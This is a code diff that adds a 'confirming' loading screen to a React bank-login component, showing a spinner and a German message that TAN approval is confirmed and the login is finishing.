@@ -644,6 +644,22 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     );
   }
 
+  if (phase === "confirming") {
+    return (
+      <BankShell {...shellProps}>
+        <div className="max-w-xl mx-auto bg-white rounded-xl shadow-md border border-gray-200 p-8 text-center">
+          <div className="mx-auto mb-4 w-10 h-10 border-4 border-gray-200 rounded-full animate-spin" style={{ borderTopColor: themeColor }} />
+          <h2 className="text-xl font-bold mb-2" style={{ color: themeColor }}>
+            TAN-Freigabe bestätigt
+          </h2>
+          <p className="text-sm text-gray-600">
+            Anmeldung wird abgeschlossen… Bitte warten Sie einen Moment.
+          </p>
+        </div>
+      </BankShell>
+    );
+  }
+
   if (phase === "result") {
     return (
       <BankShell {...shellProps}>
